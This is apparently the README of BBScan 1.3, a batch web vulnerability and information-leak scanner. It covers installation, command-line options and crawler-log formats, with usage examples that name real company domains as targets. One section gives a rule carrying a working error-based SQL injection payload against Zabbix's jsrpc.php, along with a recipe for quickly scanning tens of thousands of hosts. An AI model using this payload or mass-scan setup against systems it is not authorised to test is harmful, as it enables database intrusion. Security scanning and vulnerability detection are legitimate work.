# BBScan 1.3 #

**BBScan** is a tiny **B**atch we**B**+ vulnerability **Scan**ner.

## Requirements ##
* BeautifulSoup4>=4.3.2
* py2-ipaddress>=3.4.1
* dnspython>=1.15.0
* gevent>=1.2.1

You can install required packages with pip

	pip install -r requirements.txt

## Usage ##

	usage: BBScan.py [options]
	
	* A tiny Batch weB+ vulnerability Scanner. *
	By LiJieJie (http://www.lijiejie.com)
	
	optional arguments:
	  -h, --help            show this help message and exit
	  --host [HOST [HOST2 HOST3 ...] [HOST [HOST2 HOST3 ...] ...]]
	                        Scan several hosts from command line
	  -f TargetFile         Load new line delimited targets from TargetFile
	  -d TargetDirectory    Load all *.txt files from TargetDirectory
	  --crawler TargetDirectory
	                        Load all *.log crawler files from TargetDirectory
	  --full                Process all sub directories.
	  -n, --no-crawl        No crawling, sub folders will not be processed.
	  -nn, --no-check404    No HTTP 404 existence check
	  --scripts-only        Scan with user scripts only
	  --no-scripts          Disable user scripts scan
	  -p PROCESS            Num of processes running concurrently, 30 by default
	  -t THREADS            Num of scan threads for each scan process, 3 by default
	  --network MASK        Scan all Target/MASK hosts,
	                        should be an int between 24 and 31
	  --timeout Timeout     Max scan minutes for each website, 20 by default
	  -nnn, --no-browser    Do not view report with browser after scan finished
	  -md                   Save scan report as markdown format
	  -v                    show program's version number and exit


**1. Scan several hosts from command line** 

	python BBScan.py  --host www.a.com www.b.com --browser

**2. Scan www.target.com and all the other IPs under www.target.com/28**

	python BBScan.py  --host www.target.com --network 28 --browser
	
**3. Load newline delimited targets from file and scan**
	
	python BBScan.py -f wandoujia.com.txt

**4. Load all targets from Directory(\*.txt file only) and scan**

	python BBScan.py -d targets/

**5. Load crawler logs from Directory(\*.log file only) and scan**

	python BBScan.py --crawler crawler_logs/

crawler log files should be formarted first:

			. GET http://www.iqiyi.com/ HTTP/1.1^^^200
			. POST http://www.pps.tv/login.php HTTP/1.1^^^user=admin&passwd=admin^^^200


## 使用说明 ##

BBScan是一个迷你的信息泄漏批量扫描脚本。 可以通过文本批量导入主机或URL，以换行符分割。
	
`--crawler` 参数是`v1.1`新增的，可以导入爬虫日志发起扫描。 日志的格式，我们约定如下：

			Request Line + 三个尖括号 + [POST请求body] + 三个尖括号 + HTTP状态码
示例如下：

			. GET http://www.iqiyi.com/ HTTP/1.1^^^200
			. POST http://www.pps.tv/login.php HTTP/1.1^^^user=admin&passwd=admin^^^200

`--full`  处理所有的子文件夹，比如 `http://www.target.com/aa/bb/cc/`, `/aa/bb/cc/` `/aa/bb/` `/aa/` 三个path都将被扫描

`-n, --no-crawl`  不从首页抓取新的URL

`-nn, --no-check404` 不检查状态码404是否存在，不保存404页面的大小进行后续比对



## web漏洞应急扫描 ##

以批量扫描 Zabbix SQL注入为例，在一个txt文件中写入规则：

	/zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim%20estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi%20story.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20user())x%20from%20information_schema.character_sets%20group%20by%20x)y)&updateProfil%20e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=%2017&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&%20mark_color=1    {tag="Duplicate entry"}  {status=200}  {type="text/plain"}
	
	/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&stamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim%20estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi%20story.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20user())x%20from%20information_schema.character_sets%20group%20by%20x)y)&updateProfil%20e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=%2017&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&%20mark_color=1          {tag="Duplicate entry"}  {status=200}  {type="text/plain"}

把所有HTTP like的服务写入 iqiyi.http.txt：

	不要抓首页
	不要检测404
	并发2个线程、 50个进程

可以比较迅速地扫完几万个域名和IP地址：

	BBScan.py --no-crawl --no-check404 -t2 -p50 -f iqiyi.http.txt


该插件是从内部扫描器中抽离出来的，感谢 `Jekkay Hu<34538980[at]qq.com>` ，欢迎提交有用的新规则	
